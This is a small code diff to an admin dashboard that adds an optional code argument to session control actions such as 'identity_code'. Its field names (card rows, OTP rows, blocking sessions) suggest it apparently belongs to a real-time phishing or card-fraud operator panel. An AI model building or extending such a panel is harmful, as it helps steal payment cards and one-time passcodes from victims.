@@ -127,7 +127,7 @@ function SessionBox({
   blocked?: string;
   selected: boolean;
   onToggleSelect: () => void;
-  onControl: (sessionId: string, action: string) => Promise<void>;
+  onControl: (sessionId: string, action: string, code?: string) => Promise<void>;
   onBlock: () => void;
   onUnblock: () => void;
   onDelete: () => void;
@@ -165,10 +165,10 @@ function SessionBox({
     setExpanded(cardRows.length > 0 || otpRows.length > 0);
   }, [cardRows.length, otpRows.length]);
 
-  const handleControl = async (action: string) => {
+  const handleControl = async (action: string, code?: string) => {
     setLoadingAction(action);
     try {
-      await onControl(sessionId, action);
+      await onControl(sessionId, action, code);
     } finally {
       setLoadingAction(null);
     }
@@ -382,7 +382,7 @@ function SessionBox({
                     if (!code) return;
                     setLoadingAction("identity_code");
                     try {
-                      await onControl(sessionId, "identity_code");
+                      await onControl(sessionId, "identity_code", code);
                     } finally {
                       setLoadingAction(null);
                       if (input) input.value = "";
@@ -593,10 +593,10 @@ export default function AdminDashboard() {
     setTrashItems([]);
   }, []);
 
-  const handleControlAction = useCallback(async (sessionId: string, action: string) => {
+  const handleControlAction = useCallback(async (sessionId: string, action: string, code?: string) => {
     const token = getToken();
     if (!token) return;
-    await sendAdminControl(sessionId, action, token);
+    await sendAdminControl(sessionId, action, token, code);
     await fetchData();
   }, [fetchData]);
 
